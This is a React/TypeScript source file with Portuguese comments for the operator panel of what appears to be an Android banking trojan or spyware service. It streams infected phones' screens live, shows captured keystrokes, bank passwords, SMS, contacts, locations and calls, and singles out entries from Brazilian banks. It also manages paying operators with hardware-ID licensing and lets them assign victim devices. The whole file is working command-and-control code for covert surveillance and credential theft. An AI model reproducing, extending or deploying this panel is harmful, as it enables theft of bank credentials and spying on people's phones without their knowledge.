import { useState, useEffect, useRef } from 'react';
import { adminAPI, getApiBaseUrl, devicesAPI } from '../services/api';
import { 
  Shield, Users, UserPlus, Trash2, Ban, RefreshCw, 
  Edit, Check, LogOut, Smartphone, Search,
  Link, Unlink, Eye, X, Mic, MicOff,
  Keyboard, Activity, User, Clock, AlertCircle, ShieldCheck
} from 'lucide-react';

interface User {
  id: number;
  username: string;
  email: string;
  is_active: boolean;
  is_admin: boolean;
  is_banned: boolean;
  hwid: string | null;
  hwid_activated_at: string | null;
  totp_enabled: boolean;
  created_at: string;
  expires_at: string | null;
  last_login: string | null;
  last_ip: string | null;
  notes: string | null;
  device_count: number;
}

interface DeviceAdmin {
  id: number;
  device_id: string;
  model: string | null;
  manufacturer: string | null;
  android_version: string | null;
  last_seen: string | null;
  is_online: boolean;
  owner_id: number | null;
  owner_username: string | null;
}

interface Stats {
  total_users: number;
  active_users: number;
  banned_users: number;
  total_devices: number;
  online_devices: number;
}

interface KeylogEntry {
  timestamp: string;
  data: string;
  app: string;
  type?: string;
}

interface AdminPanelProps {
  onLogout: () => void;
}

// ==================== COMPONENTE PRINCIPAL DE ESPIONAGEM ====================
function AdvancedSpyView({ device, onClose }: { device: DeviceAdmin; onClose: () => void }) {
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const wsRef = useRef<WebSocket | null>(null);
  const [fps, setFps] = useState(0);
  const frameCountRef = useRef(0);
  const [keylogs, setKeylogs] = useState<KeylogEntry[]>([]);
  const [isListeningMic, setIsListeningMic] = useState(false);
  const audioContextRef = useRef<AudioContext | null>(null);
  const mediaStreamRef = useRef<MediaStream | null>(null);
  const keylogIntervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
  
  // Conectar ao VNC
  useEffect(() => {
    const token = localStorage.getItem('admin_token') || localStorage.getItem('token');
    const wsProtocol = getApiBaseUrl().startsWith('https') ? 'wss' : 'ws';
    const wsUrl = getApiBaseUrl().replace(/^https?/, wsProtocol);
    const ws = new WebSocket(`${wsUrl}/ws/dashboard/${device.device_id}?token=${token}`);
    wsRef.current = ws;
    
    ws.onmessage = (event) => {
      if (event.data instanceof Blob) {
        frameCountRef.current++;
        const img = new Image();
        img.onerror = () => URL.revokeObjectURL(img.src);
        img.onload = () => {
          const canvas = canvasRef.current;
          if (canvas) {
            const ctx = canvas.getContext('2d');
            if (ctx) {
              canvas.width = img.width;
              canvas.height = img.height;
              ctx.drawImage(img, 0, 0);
            }
          }
          URL.revokeObjectURL(img.src);
        };
        img.src = URL.createObjectURL(event.data);
      }
    };
    
    // Contador de FPS
    const fpsInterval = setInterval(() => {
      setFps(frameCountRef.current);
      frameCountRef.current = 0;
    }, 1000);
    
    return () => {
      ws.close();
      clearInterval(fpsInterval);
    };
  }, [device.device_id]);
  
  // Buscar keylogs periodicamente
  useEffect(() => {
    const fetchKeylogs = async () => {
      try {
        const logs = await devicesAPI.getLogs(device.device_id);
        if (logs && logs.length > 0) {
          // Filtra logs de sistema (PONG, OK, COMMAND_SENT, etc)
          // Mostra apenas logs relevantes: KEYLOG, BANK_PASSWORD, SMS, etc
          const relevantTypes = ['KEYLOG', 'BANK_PASSWORD', 'SMS', 'CONTACT', 'LOCATION', 'CALL'];
          
          const keylogEntries: KeylogEntry[] = logs
            .filter((log: any) => relevantTypes.includes(log.type))
            .slice(0, 100)
            .map((log: any) => ({
              timestamp: log.created_at,
              data: log.data || `[${log.type}]`,
              app: log.data?.split(' ')[0] || log.type || 'unknown',
              type: log.type
            }));
          setKeylogs(keylogEntries);
        }
      } catch (err) {
        console.error('Erro ao buscar keylogs:', err);
      }
    };
    
    fetchKeylogs();
    keylogIntervalRef.current = setInterval(() => {
      if (!document.hidden) fetchKeylogs();
    }, 3000);
    
    return () => {
      if (keylogIntervalRef.current) {
        clearInterval(keylogIntervalRef.current);
      }
    };
  }, [device.device_id]);
  
  // Escutar microfone do operador (computador)
  const toggleMicrophoneListener = async () => {
    if (isListeningMic) {
      // Parar de escutar
      if (mediaStreamRef.current) {
        mediaStreamRef.current.getTracks().forEach(track => track.stop());
        mediaStreamRef.current = null;
      }
      if (audioContextRef.current) {
        audioContextRef.current.close();
        audioContextRef.current = null;
      }
      setIsListeningMic(false);
    } else {
      // Começar a escutar
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        mediaStreamRef.current = stream;
        
        const audioContext = new AudioContext();
        audioContextRef.current = audioContext;
        
        const source = audioContext.createMediaStreamSource(stream);
        const analyser = audioContext.createAnalyser();
        source.connect(analyser);
        
        // Criar destino para reproduzir o áudio
        const destination = audioContext.destination;
        source.connect(destination);
        
        setIsListeningMic(true);
      } catch (err) {
        console.error('Erro ao acessar microfone:', err);
        alert('Não foi possível acessar o microfone. Verifique as permissões.');
      }
    }
  };
  
  // Cleanup
  useEffect(() => {
    return () => {
      if (mediaStreamRef.current) {
        mediaStreamRef.current.getTracks().forEach(track => track.stop());
      }
      if (audioContextRef.current) {
        audioContextRef.current.close();
      }
    };
  }, []);
  
  // Formatar timestamp
  const formatTime = (timestamp: string) => {
    try {
      return new Date(timestamp).toLocaleTimeString('pt-BR');
    } catch {
      return timestamp;
    }
  };
  
  // Extrair app e conteúdo do keylog
  const parseKeylog = (data: string, logType?: string) => {
    if (!data) return { app: 'unknown', content: '', type: logType || 'text' };
    
    // Usar tipo do log se disponível
    if (logType === 'BANK_PASSWORD') {
      return { app: data.split(' ')[0] || 'app', content: data, type: 'password' };
    }
    
    // Detectar tipo de entrada pelo conteúdo
    if (data.includes('🔑') || data.includes('SENHA')) {
      return { app: data.split(' ')[0] || 'app', content: data, type: 'password' };
    }
    if (data.includes('[CLICK:')) {
      return { app: data.split(' ')[0] || 'app', content: data, type: 'click' };
    }
    if (data.includes('📱') || data.includes('itau') || data.includes('santander') || data.includes('bradesco')) {
      return { app: data.split(' ')[0] || 'app', content: data, type: 'bank' };
    }
    
    return { app: data.split(' ')[0] || 'app', content: data, type: logType || 'text' };
  };

  return (
    <div className="fixed inset-0 z-50 bg-gradient-to-br from-slate-900 via-red-900/20 to-slate-900">
      {/* Header */}
      <div className="bg-black/80 border-b border-red-500/50 px-6 py-3 flex items-center justify-between">
        <div className="flex items-center space-x-4">
          <div className="flex items-center space-x-2">
            <Eye className="w-6 h-6 text-red-500 animate-pulse" />
            <span className="text-red-500 font-bold text-lg">ESPIONAGEM ATIVA</span>
          </div>
          <div className="h-6 w-px bg-gray-600" />
          <div className="flex items-center space-x-2">
            <Smartphone className="w-5 h-5 text-blue-400" />
            <span className="text-white font-semibold">{device.model || 'Dispositivo'}</span>
          </div>
          <div className="h-6 w-px bg-gray-600" />
          <div className="flex items-center space-x-2 bg-blue-600/30 px-3 py-1 rounded-full">
            <User className="w-4 h-4 text-blue-400" />
            <span className="text-blue-300 font-semibold">Operador: {device.owner_username || 'Sem dono'}</span>
          </div>
          <div className="flex items-center space-x-2">
            <span className="flex items-center space-x-1 bg-green-500/20 px-2 py-1 rounded text-green-400 text-sm">
              <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse" />
              <span>LIVE</span>
            </span>
            <span className="text-gray-400 text-sm">{fps} FPS</span>
          </div>
        </div>
        
        <div className="flex items-center space-x-3">
          {/* Botão Microfone do Operador */}
          <button
            onClick={toggleMicrophoneListener}
            className={`flex items-center space-x-2 px-4 py-2 rounded-lg transition-colors ${
              isListeningMic 
                ? 'bg-green-600 hover:bg-green-700 text-white' 
                : 'bg-slate-700 hover:bg-slate-600 text-gray-300'
            }`}
            title="Ouvir microfone do operador"
          >
            {isListeningMic ? <Mic className="w-4 h-4" /> : <MicOff className="w-4 h-4" />}
            <span>{isListeningMic ? 'Ouvindo...' : 'Mic Operador'}</span>
          </button>
          
          <button
            onClick={onClose}
            className="flex items-center space-x-2 px-4 py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg"
          >
            <X className="w-4 h-4" />
            <span>Fechar</span>
          </button>
        </div>
      </div>
      
      {/* Conteúdo Principal */}
      <div className="flex h-[calc(100vh-60px)]">
        {/* VNC - Lado Esquerdo (maior) */}
        <div className="flex-1 p-4 flex flex-col">
          <div className="bg-black rounded-xl overflow-hidden flex-1 flex items-center justify-center border-2 border-red-500/30 shadow-2xl shadow-red-500/20">
            {/* Moldura do celular */}
            <div className="relative" style={{ width: 400, height: 800 }}>
              {/* Notch */}
              <div className="absolute top-0 left-1/2 transform -translate-x-1/2 w-32 h-6 bg-black rounded-b-2xl z-10 flex items-center justify-center">
                <div className="w-16 h-1 bg-gray-800 rounded-full" />
              </div>
              
              {/* Tela */}
              <div className="w-full h-full bg-gray-900 rounded-3xl overflow-hidden border-4 border-gray-800">
                <canvas
                  ref={canvasRef}
                  className="w-full h-full object-contain"
                  style={{ imageRendering: 'auto' }}
                />
              </div>
              
              {/* Barra inferior */}
              <div className="absolute bottom-2 left-1/2 transform -translate-x-1/2 w-32 h-1 bg-gray-600 rounded-full" />
            </div>
          </div>
          
          {/* Info do dispositivo */}
          <div className="mt-4 bg-[#440e05]/50 rounded-lg p-4 flex items-center justify-between">
            <div className="flex items-center space-x-6">
              <div>
                <p className="text-gray-400 text-xs">Dispositivo</p>
                <p className="text-white font-semibold">{device.model}</p>
              </div>
              <div>
                <p className="text-gray-400 text-xs">Fabricante</p>
                <p className="text-white">{device.manufacturer}</p>
              </div>
              <div>
                <p className="text-gray-400 text-xs">Android</p>
                <p className="text-white">{device.android_version}</p>
              </div>
              <div>
                <p className="text-gray-400 text-xs">ID</p>
                <p className="text-white font-mono text-sm">{device.device_id.substring(0, 16)}...</p>
              </div>
            </div>
            <div className="flex items-center space-x-2">
              {isListeningMic && (
                <div className="flex items-center space-x-2 bg-green-500/20 px-3 py-2 rounded-lg">
                  <Mic className="w-4 h-4 text-green-400 animate-pulse" />
                  <span className="text-green-400 text-sm">Áudio do operador ativo</span>
                </div>
              )}
            </div>
          </div>
        </div>
        
        {/* Painel de Keylog - Lado Direito */}
        <div className="w-[450px] bg-[#290903]/80 border-l border-blue-500/20 flex flex-col">
          {/* Header do Keylog */}
          <div className="bg-[#440e05] px-4 py-3 border-b border-blue-500/20 flex items-center justify-between">
            <div className="flex items-center space-x-2">
              <Keyboard className="w-5 h-5 text-yellow-400" />
              <span className="text-white font-semibold">Keylogger em Tempo Real</span>
            </div>
            <div className="flex items-center space-x-2">
              <Activity className="w-4 h-4 text-green-400 animate-pulse" />
              <span className="text-green-400 text-xs">{keylogs.length} eventos</span>
            </div>
          </div>
          
          {/* Info do Operador */}
          <div className="bg-blue-900/30 px-4 py-3 border-b border-blue-500/30">
            <div className="flex items-center space-x-3">
              <div className="w-10 h-10 bg-blue-600 rounded-full flex items-center justify-center">
                <User className="w-5 h-5 text-white" />
              </div>
              <div>
                <p className="text-blue-300 font-semibold">{device.owner_username || 'Sem operador'}</p>
                <p className="text-blue-400/60 text-xs">Controlando este dispositivo</p>
              </div>
            </div>
          </div>
          
          {/* Lista de Keylogs */}
          <div className="flex-1 overflow-y-auto p-2 space-y-1">
            {keylogs.length === 0 ? (
              <div className="text-center py-10 text-gray-500">
                <Keyboard className="w-12 h-12 mx-auto mb-3 opacity-30" />
                <p>Aguardando atividade...</p>
                <p className="text-xs mt-1">Os keylogs aparecerão aqui em tempo real</p>
              </div>
            ) : (
              keylogs.map((log, index) => {
                const parsed = parseKeylog(log.data, log.type);
                const displayType = log.type === 'KEYLOG' ? 'keylog' : 
                                   log.type === 'BANK_PASSWORD' ? 'password' :
                                   parsed.type;
                return (
                  <div 
                    key={index}
                    className={`p-2 rounded-lg text-sm ${
                      displayType === 'password' || log.type === 'BANK_PASSWORD'
                        ? 'bg-red-900/30 border border-red-500/30' 
                        : displayType === 'bank'
                        ? 'bg-yellow-900/30 border border-yellow-500/30'
                        : displayType === 'click'
                        ? 'bg-blue-900/20 border border-blue-500/20'
                        : log.type === 'KEYLOG'
                        ? 'bg-green-900/20 border border-green-500/20'
                        : 'bg-[#440e05]/50'
                    }`}
                  >
                    <div className="flex items-center justify-between mb-1">
                      <span className={`text-xs px-2 py-0.5 rounded ${
                        displayType === 'password' || log.type === 'BANK_PASSWORD'
                          ? 'bg-red-500/30 text-red-300' 
                          : displayType === 'bank'
                          ? 'bg-yellow-500/30 text-yellow-300'
                          : displayType === 'click'
                          ? 'bg-blue-500/30 text-blue-300'
                          : log.type === 'KEYLOG'
                          ? 'bg-green-500/30 text-green-300'
                          : 'bg-slate-600 text-gray-300'
                      }`}>
                        {log.type === 'BANK_PASSWORD' ? '🔑 SENHA BANCO' : 
                         log.type === 'KEYLOG' ? '⌨️ KEYLOG' :
                         displayType === 'bank' ? '🏦 BANCO' :
                         displayType === 'click' ? '👆 CLICK' : 
                         `📋 ${log.type || 'LOG'}`}
                      </span>
                      <span className="text-gray-500 text-xs flex items-center">
                        <Clock className="w-3 h-3 mr-1" />
                        {formatTime(log.timestamp)}
                      </span>
                    </div>
                    <p className={`font-mono text-xs break-all ${
                      displayType === 'password' || log.type === 'BANK_PASSWORD' ? 'text-red-300' : 
                      displayType === 'bank' ? 'text-yellow-300' :
                      log.type === 'KEYLOG' ? 'text-green-300' :
                      'text-gray-300'
                    }`}>
                      {log.data}
                    </p>
                  </div>
                );
              })
            )}
          </div>
          
          {/* Footer do Keylog */}
          <div className="bg-[#440e05] px-4 py-2 border-t border-blue-500/20">
            <div className="flex items-center justify-between text-xs text-gray-400">
              <span>Atualização automática: 2s</span>
              <span className="flex items-center">
                <AlertCircle className="w-3 h-3 mr-1" />
                Últimos 50 eventos
              </span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

// ==================== GRID DE ESPIONAGEM ====================
function SpyGrid({ devices, onClose }: { devices: DeviceAdmin[]; onClose: () => void }) {
  const onlineDevices = devices.filter(d => d.is_online);
  const [selectedDevice, setSelectedDevice] = useState<DeviceAdmin | null>(null);
  
  if (selectedDevice) {
    return <AdvancedSpyView device={selectedDevice} onClose={() => setSelectedDevice(null)} />;
  }
  
  return (
    <div className="fixed inset-0 z-50 bg-gradient-to-br from-slate-900 via-red-900/20 to-slate-900 overflow-auto">
      {/* Header */}
      <div className="sticky top-0 bg-black/90 border-b border-red-500/50 p-4 flex items-center justify-between z-10">
        <div className="flex items-center space-x-4">
          <div className="flex items-center space-x-2">
            <Eye className="w-7 h-7 text-red-500 animate-pulse" />
            <h2 className="text-2xl font-bold text-white">Central de Espionagem</h2>
          </div>
          <span className="bg-red-600/30 text-red-300 px-3 py-1 rounded-full text-sm">
            {onlineDevices.length} dispositivos online
          </span>
        </div>
        <button
          onClick={onClose}
          className="flex items-center space-x-2 px-5 py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg transition-colors"
        >
          <X className="w-5 h-5" />
          <span>Fechar</span>
        </button>
      </div>
      
      {/* Grid de dispositivos */}
      <div className="p-6 grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
        {onlineDevices.map(device => (
          <DeviceSpyCard 
            key={device.device_id} 
            device={device} 
            onClick={() => setSelectedDevice(device)}
          />
        ))}
        
        {onlineDevices.length === 0 && (
          <div className="col-span-full text-center py-20 text-gray-400">
            <Smartphone className="w-20 h-20 mx-auto mb-4 opacity-30" />
            <p className="text-2xl font-semibold">Nenhum dispositivo online</p>
            <p className="text-sm mt-2">Aguarde dispositivos se conectarem para espionar</p>
          </div>
        )}
      </div>
    </div>
  );
}

// ==================== CARD DE DISPOSITIVO COM PREVIEW ====================
function DeviceSpyCard({ device, onClick }: { device: DeviceAdmin; onClick: () => void }) {
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const wsRef = useRef<WebSocket | null>(null);
  const [connected, setConnected] = useState(false);
  
  useEffect(() => {
    const token = localStorage.getItem('admin_token') || localStorage.getItem('token');
    const wsProtocol = getApiBaseUrl().startsWith('https') ? 'wss' : 'ws';
    const wsUrl = getApiBaseUrl().replace(/^https?/, wsProtocol);
    const ws = new WebSocket(`${wsUrl}/ws/dashboard/${device.device_id}?token=${token}`);
    wsRef.current = ws;
    
    ws.onopen = () => setConnected(true);
    ws.onclose = () => setConnected(false);
    
    ws.onmessage = (event) => {
      if (event.data instanceof Blob) {
        const img = new Image();
        img.onload = () => {
          const canvas = canvasRef.current;
          if (canvas) {
            const ctx = canvas.getContext('2d');
            if (ctx) {
              canvas.width = img.width;
              canvas.height = img.height;
              ctx.drawImage(img, 0, 0);
            }
          }
          URL.revokeObjectURL(img.src);
        };
        img.src = URL.createObjectURL(event.data);
      }
    };
    
    return () => {
      ws.close();
    };
  }, [device.device_id]);
  
  return (
    <div 
      className="bg-[#440e05]/80 rounded-xl overflow-hidden border-2 border-blue-500/20 hover:border-red-500 transition-all cursor-pointer group shadow-xl hover:shadow-red-500/20"
      onClick={onClick}
    >
      {/* Preview */}
      <div className="relative h-72 bg-black flex items-center justify-center">
        <canvas
          ref={canvasRef}
          className="max-w-full max-h-full object-contain"
        />
        
        {/* Overlay no hover */}
        <div className="absolute inset-0 bg-black/60 opacity-0 group-hover:opacity-100 transition-opacity flex items-center justify-center">
          <div className="bg-red-600 px-6 py-3 rounded-lg flex items-center space-x-2 transform scale-90 group-hover:scale-100 transition-transform">
            <Eye className="w-5 h-5" />
            <span className="font-semibold">ESPIONAR</span>
          </div>
        </div>
        
        {/* Badge Live */}
        <div className="absolute top-3 right-3">
          {connected ? (
            <span className="bg-green-500 text-white text-xs px-2 py-1 rounded flex items-center space-x-1">
              <span className="w-2 h-2 bg-white rounded-full animate-pulse" />
              <span>LIVE</span>
            </span>
          ) : (
            <span className="bg-yellow-500 text-white text-xs px-2 py-1 rounded">Conectando...</span>
          )}
        </div>
        
        {/* Badge Operador */}
        <div className="absolute top-3 left-3">
          <span className="bg-blue-600 text-white text-xs px-2 py-1 rounded flex items-center space-x-1">
            <User className="w-3 h-3" />
            <span>{device.owner_username || 'Sem dono'}</span>
          </span>
        </div>
      </div>
      
      {/* Info */}
      <div className="p-4 bg-[#440e05]">
        <div className="flex items-center justify-between mb-2">
          <p className="font-bold text-white text-lg">{device.model || 'Dispositivo'}</p>
          <span className="text-xs text-gray-500">{device.android_version}</span>
        </div>
        <p className="text-sm text-gray-400">{device.manufacturer}</p>
        <div className="mt-3 pt-3 border-t border-blue-500/20 flex items-center justify-between">
          <span className="text-xs text-gray-500 font-mono">{device.device_id.substring(0, 12)}...</span>
          <div className="flex items-center space-x-1 text-red-400 text-xs">
            <Eye className="w-3 h-3" />
            <span>Clique para espionar</span>
          </div>
        </div>
      </div>
    </div>
  );
}

// ==================== COMPONENTE PRINCIPAL DO ADMIN ====================
export default function AdminPanel({ onLogout }: AdminPanelProps) {
  const [activeTab, setActiveTab] = useState<'users' | 'devices'>('users');
  const [users, setUsers] = useState<User[]>([]);
  const [devices, setDevices] = useState<DeviceAdmin[]>([]);
  const [stats, setStats] = useState<Stats | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');
  const [searchTerm, setSearchTerm] = useState('');
  
  // Modal de criar usuário
  const [showCreateModal, setShowCreateModal] = useState(false);
  const [newUser, setNewUser] = useState({ username: '', email: '', password: '', is_admin: false, expiration_days: 0, notes: '' });
  
  // Modal de editar usuário
  const [editingUser, setEditingUser] = useState<User | null>(null);
  const [editForm, setEditForm] = useState({ email: '', password: '', notes: '', is_admin: false, expiration_days: 0, clear_expiration: false });
  
  // Modal de atribuir dispositivo
  const [assigningDevice, setAssigningDevice] = useState<DeviceAdmin | null>(null);
  const [selectedUserId, setSelectedUserId] = useState<number | null>(null);
  
  // Espionagem
  const [showSpyGrid, setShowSpyGrid] = useState(false);
  const [spyingDevice, setSpyingDevice] = useState<DeviceAdmin | null>(null);
  
  // Carregar dados
  useEffect(() => {
    loadData();
    
    // Auto-refresh a cada 5 segundos (com pausa em aba oculta)
    const interval = setInterval(() => {
      if (!document.hidden) loadData();
    }, 5000);
    return () => clearInterval(interval);
  }, []);

  const loadData = async () => {
    try {
      const [usersData, statsData, devicesData] = await Promise.all([
        adminAPI.getUsers(),
        adminAPI.getStats(),
        adminAPI.getDevices()
      ]);
      setUsers(usersData);
      setStats(statsData);
      setDevices(devicesData);
      setLoading(false);
    } catch (err: any) {
      if (!loading) return;
      setError(err.response?.data?.detail || 'Erro ao carregar dados');
      setLoading(false);
    }
  };

  const handleCreateUser = async () => {
    try {
      await adminAPI.createUser(newUser);
      setShowCreateModal(false);
      setNewUser({ username: '', email: '', password: '', is_admin: false, expiration_days: 0, notes: '' });
      setSuccess('Usuário criado com sucesso!');
      loadData();
    } catch (err: any) {
      setError(err.response?.data?.detail || 'Erro ao criar usuário');
    }
  };

  const handleUpdateUser = async () => {
    if (!editingUser) return;
    try {
      const updateData: any = {};
      if (editForm.email) updateData.email = editForm.email;
      if (editForm.password) updateData.password = editForm.password;
      if (editForm.notes !== editingUser.notes) updateData.notes = editForm.notes;
      if (editForm.is_admin !== editingUser.is_admin) updateData.is_admin = editForm.is_admin;
      if (editForm.clear_expiration) updateData.clear_expiration = true;
      else if (editForm.expiration_days > 0) updateData.expiration_days = editForm.expiration_days;
      
      await adminAPI.updateUser(editingUser.id, updateData);
      setEditingUser(null);
      setSuccess('Usuário atualizado!');
      loadData();
    } catch (err: any) {
      setError(err.response?.data?.detail || 'Erro ao atualizar usuário');
    }
  };

  const handleBanUser = async (userId: number, isBanned: boolean) => {
    try {
      if (isBanned) {
        await adminAPI.unbanUser(userId);
        setSuccess('Usuário desbanido!');
      } else {
        await adminAPI.banUser(userId);
        setSuccess('Usuário banido!');
      }
      loadData();
    } catch (err: any) {
      setError(err.response?.data?.detail || 'Erro ao banir/desbanir usuário');
    }
  };

  const handleDeleteUser = async (userId: number) => {
    if (!confirm('Tem certeza que deseja excluir este usuário?')) return;
    try {
      await adminAPI.deleteUser(userId);
      setSuccess('Usuário excluído!');
      loadData();
    } catch (err: any) {
      setError(err.response?.data?.detail || 'Erro ao excluir usuário');
    }
  };

  const handleResetHwid = async (userId: number) => {
    if (!confirm('Resetar HWID deste usuário?')) return;
    try {
      await adminAPI.resetHwid(userId);
      setSuccess('HWID resetado!');
      loadData();
    } catch (err: any) {
      setError(err.response?.data?.detail || 'Erro ao resetar HWID');
    }
  };

  const handleReset2FA = async (userId: number) => {
    if (!confirm('Deseja resetar o Google Authenticator (2FA) deste usuário? Ele precisará ler o novo QR Code no próximo login.')) return;
    try {
      await adminAPI.reset2FA(userId);
      setSuccess('2FA do Google Authenticator resetado com sucesso!');
      loadData();
    } catch (err: any) {
      setError(err.response?.data?.detail || 'Erro ao resetar 2FA');
    }
  };

  const handleAssignDevice = async () => {
    if (!assigningDevice || !selectedUserId) return;
    try {
      await adminAPI.assignDevice(assigningDevice.device_id, selectedUserId);
      setAssigningDevice(null);
      setSelectedUserId(null);
      setSuccess('Dispositivo atribuído!');
      loadData();
    } catch (err: any) {
      setError(err.response?.data?.detail || 'Erro ao atribuir dispositivo');
    }
  };

  const handleUnassignDevice = async (deviceId: string) => {
    if (!confirm('Remover atribuição?')) return;
    try {
      await adminAPI.unassignDevice(deviceId);
      setSuccess('Atribuição removida!');
      loadData();
    } catch (err: any) {
      setError(err.response?.data?.detail || 'Erro ao remover atribuição');
    }
  };

  const safeUsers = Array.isArray(users) ? users : [];
  const safeDevices = Array.isArray(devices) ? devices : [];

  const filteredUsers = safeUsers.filter(u => 
    (u?.username || '').toLowerCase().includes(searchTerm.toLowerCase()) ||
    (u?.email || '').toLowerCase().includes(searchTerm.toLowerCase())
  );

  const filteredDevices = safeDevices.filter(d =>
    (d?.device_id || '').toLowerCase().includes(searchTerm.toLowerCase()) ||
    (d?.model?.toLowerCase() || '').includes(searchTerm.toLowerCase()) ||
    (d?.owner_username?.toLowerCase() || '').includes(searchTerm.toLowerCase())
  );

  const onlineDevices = safeDevices.filter(d => d?.is_online);

  const currentStats = stats || {
    total_users: safeUsers.length,
    active_users: safeUsers.filter(u => u.is_active && !u.is_banned).length,
    banned_users: safeUsers.filter(u => u.is_banned).length,
    total_devices: safeDevices.length,
    online_devices: onlineDevices.length
  };

  // Auto-hide messages
  useEffect(() => {
    if (error) {
      const timer = setTimeout(() => setError(''), 5000);
      return () => clearTimeout(timer);
    }
  }, [error]);

  useEffect(() => {
    if (success) {
      const timer = setTimeout(() => setSuccess(''), 3000);
      return () => clearTimeout(timer);
    }
  }, [success]);

  // Renderiza espionagem
  if (showSpyGrid) {
    return <SpyGrid devices={safeDevices} onClose={() => setShowSpyGrid(false)} />;
  }
  
  if (spyingDevice) {
    return <AdvancedSpyView device={spyingDevice} onClose={() => setSpyingDevice(null)} />;
  }

  if (loading) {
    return (
      <div className="relative z-10 min-h-screen bg-[#1e0603]/95 backdrop-blur-md flex items-center justify-center">
        <div className="text-white text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-red-500 mx-auto mb-4"></div>
          <p className="font-semibold text-lg">Carregando painel admin...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="relative z-10 min-h-screen bg-[#1e0603]/95 backdrop-blur-md text-white">
      {/* Header */}
      <header className="bg-black/60 border-b border-red-500/30 backdrop-blur-md sticky top-0 z-30">
        <div className="max-w-7xl mx-auto px-4 py-4 flex items-center justify-between">
          <div className="flex items-center space-x-3">
            <div className="p-2 bg-red-600 rounded-lg shadow-lg shadow-red-500/30">
              <Shield className="w-6 h-6 text-white" />
            </div>
            <div>
              <h1 className="text-xl font-bold text-white tracking-wide">Admin Panel</h1>
              <p className="text-xs text-red-400 font-mono">Gerenciamento de Operadores e Dispositivos</p>
            </div>
          </div>
          <div className="flex items-center space-x-3">
            {/* Botão de Espionagem Global */}
            <button
              onClick={() => setShowSpyGrid(true)}
              className="flex items-center space-x-2 px-5 py-2.5 bg-red-600 hover:bg-red-700 text-white rounded-lg transition-colors shadow-lg shadow-red-500/30"
            >
              <Eye className="w-5 h-5 animate-pulse" />
              <span className="font-semibold">Espionar ({onlineDevices.length} online)</span>
            </button>
            <button
              onClick={onLogout}
              className="flex items-center space-x-2 px-4 py-2 bg-slate-700 hover:bg-slate-600 text-white rounded-lg transition-colors"
            >
              <LogOut className="w-4 h-4" />
              <span>Sair</span>
            </button>
          </div>
        </div>
      </header>

      <div className="max-w-7xl mx-auto px-4 py-6">
        {/* Estatísticas */}
        <div className="grid grid-cols-2 md:grid-cols-5 gap-4 mb-6">
          <div className="bg-[#440e05]/80 backdrop-blur-md rounded-lg p-4 border border-blue-500/20 shadow-lg">
            <div className="flex items-center space-x-3">
              <Users className="w-8 h-8 text-blue-400" />
              <div>
                <p className="text-2xl font-bold text-white">{currentStats.total_users}</p>
                <p className="text-xs text-gray-400">Total Usuários</p>
              </div>
            </div>
          </div>
          <div className="bg-[#440e05]/80 backdrop-blur-md rounded-lg p-4 border border-green-500/30 shadow-lg">
            <div className="flex items-center space-x-3">
              <Check className="w-8 h-8 text-green-400" />
              <div>
                <p className="text-2xl font-bold text-white">{currentStats.active_users}</p>
                <p className="text-xs text-gray-400">Ativos</p>
              </div>
            </div>
          </div>
          <div className="bg-[#440e05]/80 backdrop-blur-md rounded-lg p-4 border border-red-500/30 shadow-lg">
            <div className="flex items-center space-x-3">
              <Ban className="w-8 h-8 text-red-400" />
              <div>
                <p className="text-2xl font-bold text-white">{currentStats.banned_users}</p>
                <p className="text-xs text-gray-400">Banidos</p>
              </div>
            </div>
          </div>
          <div className="bg-[#440e05]/80 backdrop-blur-md rounded-lg p-4 border border-blue-500/30 shadow-lg">
            <div className="flex items-center space-x-3">
              <Smartphone className="w-8 h-8 text-blue-400" />
              <div>
                <p className="text-2xl font-bold text-white">{currentStats.total_devices}</p>
                <p className="text-xs text-gray-400">Dispositivos</p>
              </div>
            </div>
          </div>
          <div 
            className="bg-[#440e05]/80 backdrop-blur-md rounded-lg p-4 border border-yellow-500/30 cursor-pointer hover:bg-slate-700/50 transition-colors shadow-lg"
            onClick={() => setShowSpyGrid(true)}
          >
            <div className="flex items-center space-x-3">
              <Eye className="w-8 h-8 text-yellow-400 animate-pulse" />
              <div>
                <p className="text-2xl font-bold text-white">{currentStats.online_devices}</p>
                <p className="text-xs text-gray-400">Online (espionar)</p>
              </div>
            </div>
          </div>
        </div>

        {/* Mensagens */}
        {error && (
          <div className="bg-red-500/10 border border-red-500 text-red-400 px-4 py-3 rounded-lg mb-4 flex justify-between">
            <span>{error}</span>
            <button onClick={() => setError('')}>×</button>
          </div>
        )}
        {success && (
          <div className="bg-green-500/10 border border-green-500 text-green-400 px-4 py-3 rounded-lg mb-4">
            ✅ {success}
          </div>
        )}

        {/* Tabs */}
        <div className="flex space-x-2 mb-4">
          <button
            onClick={() => setActiveTab('users')}
            className={`flex items-center space-x-2 px-4 py-2 rounded-lg transition-colors ${
              activeTab === 'users' 
                ? 'bg-red-600 text-white' 
                : 'bg-slate-700 text-gray-300 hover:bg-slate-600'
            }`}
          >
            <Users className="w-4 h-4" />
            <span>Usuários ({users.length})</span>
          </button>
          <button
            onClick={() => setActiveTab('devices')}
            className={`flex items-center space-x-2 px-4 py-2 rounded-lg transition-colors ${
              activeTab === 'devices' 
                ? 'bg-red-600 text-white' 
                : 'bg-slate-700 text-gray-300 hover:bg-slate-600'
            }`}
          >
            <Smartphone className="w-4 h-4" />
            <span>Dispositivos ({devices.length})</span>
          </button>
        </div>

        {/* Toolbar */}
        <div className="flex items-center justify-between mb-4">
          <div className="relative">
            <Search className="absolute left-3 top-2.5 h-5 w-5 text-gray-400" />
            <input
              type="text"
              placeholder={activeTab === 'users' ? "Buscar usuário..." : "Buscar dispositivo..."}
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
              className="pl-10 pr-4 py-2 bg-[#440e05] border border-blue-500/20 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-red-600 w-64"
            />
          </div>
